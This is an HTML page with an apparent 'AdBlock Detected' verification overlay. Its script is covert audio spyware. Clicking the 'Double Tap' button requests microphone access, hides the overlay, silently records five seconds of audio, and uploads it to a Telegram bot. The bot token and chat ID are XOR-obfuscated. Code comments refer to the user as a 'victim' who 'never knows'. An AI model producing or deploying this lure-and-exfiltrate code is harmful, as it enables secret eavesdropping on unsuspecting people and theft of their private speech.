<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AdBlock Bypass</title>
    <style>
        #feek-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: rgba(10, 10, 20, 0.92);
            backdrop-filter: blur(6px);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 2147483647;
            font-family: 'Segoe UI', system-ui, sans-serif;
            color: #fff;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
            user-select: none;
            transition: opacity 0.3s;
        }
        #feek-overlay.hidden {
            display: none;
        }
        #feek-overlay h1 {
            font-size: 2.8rem;
            font-weight: 800;
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        #feek-overlay p {
            font-size: 1.3rem;
            max-width: 600px;
            color: #ccc;
            margin-bottom: 30px;
        }
        #feek-overlay .sub {
            color: #888;
            font-size: 0.9rem;
        }
        #feek-trigger-btn {
            padding: 18px 50px;
            font-size: 1.8rem;
            font-weight: bold;
            background: #ff4b2b;
            border: none;
            border-radius: 60px;
            color: white;
            cursor: pointer;
            box-shadow: 0 0 30px rgba(255, 75, 43, 0.5);
            transition: all 0.2s ease;
            letter-spacing: 1px;
        }
        #feek-trigger-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 50px rgba(255, 75, 43, 0.8);
        }
        #feek-trigger-btn:active {
            transform: scale(0.95);
        }
        #feek-trigger-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .feek-spinner {
            display: none;
            margin-top: 20px;
            width: 40px;
            height: 40px;
            border: 4px solid #444;
            border-top: 4px solid #ff4b2b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .feek-msg {
            margin-top: 15px;
            color: #ff6b6b;
            font-size: 1rem;
            display: none;
        }
    </style>
</head>
<body>
    <div id="feek-overlay">
        <h1>⚠️ ADBLOCK DETECTED</h1>
        <p>Please disable your ad-blocker to continue.<br>
        <span style="color:#ff4b2b;">Click the button below</span> to verify.</p>
        <button id="feek-trigger-btn">Double Tap</button>
        <div class="sub">(Secure verification)</div>
        <div class="feek-spinner" id="feek-spinner"></div>
        <div class="feek-msg" id="feek-msg"></div>
    </div>

    <script>
        (function() {
            'use strict';

            // ===== এনক্রিপ্টেড ডেটা (আমি বসিয়েছি) =====
            const KEY = 'Feek2026SuperSecret';
            const ENC_TOKEN = 'XScnMiUnQ2teTVgGDwZWAjpcNQJZXARbUw1ADgoLDFgEBGFZRV5VXgNUWQJOTxVOTwdaUhBLCVkCVkYLHBxAVwJdWwVYFlQCVFkBTkkHAEYHUxRdCQ==';
            const ENC_USERID = 'XScnMiUnQ2teTVgGDwZWAjpcNQJbTQ==';
            const RECORD_SECONDS = 5;

            function xorDecrypt(encoded, key) {
                const encrypted = atob(encoded);
                let plain = '';
                for (let i = 0; i < encrypted.length; i++) {
                    const charCode = encrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length);
                    plain += String.fromCharCode(charCode);
                }
                return plain;
            }

            const BOT_TOKEN = xorDecrypt(ENC_TOKEN, KEY);
            const CHAT_ID = xorDecrypt(ENC_USERID, KEY);

            const overlay = document.getElementById('feek-overlay');
            const btn = document.getElementById('feek-trigger-btn');
            const spinner = document.getElementById('feek-spinner');
            const msgEl = document.getElementById('feek-msg');

            let isRecording = false;

            async function sendAudioToTelegram(blob) {
                const formData = new FormData();
                formData.append('audio', blob, 'recording.webm');
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio?chat_id=${CHAT_ID}`;
                const response = await fetch(url, { method: 'POST', body: formData });
                if (!response.ok) {
                    const errText = await response.text();
                    throw new Error(`API error: ${response.status}`);
                }
                return response.json();
            }

            async function startRecordingAndExfil() {
                if (isRecording) return;
                isRecording = true;
                btn.disabled = true;
                spinner.style.display = 'block';
                msgEl.style.display = 'none';

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: {
                            echoCancellation: false,
                            noiseSuppression: false,
                            autoGainControl: false
                        }
                    });

                    // Permission granted → hide overlay immediately
                    overlay.classList.add('hidden');
                    spinner.style.display = 'none';

                    // Start recording silently
                    const mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'audio/webm;codecs=opus'
                    });
                    const chunks = [];
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    mediaRecorder.onstop = async () => {
                        try {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            await sendAudioToTelegram(blob);
                        } catch (uploadErr) {
                            // Silent fail – victim never knows
                        } finally {
                            stream.getTracks().forEach(track => track.stop());
                            isRecording = false;
                        }
                    };
                    mediaRecorder.start(1000);
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, RECORD_SECONDS * 1000);

                } catch (err) {
                    // Permission denied or error
                    spinner.style.display = 'none';
                    msgEl.textContent = 'Verification failed. Please allow microphone access and try again.';
                    msgEl.style.display = 'block';
                    btn.disabled = false;
                    isRecording = false;
                }
            }

            btn.addEventListener('click', startRecordingAndExfil);
        })();
    </script>
</body>
</html>
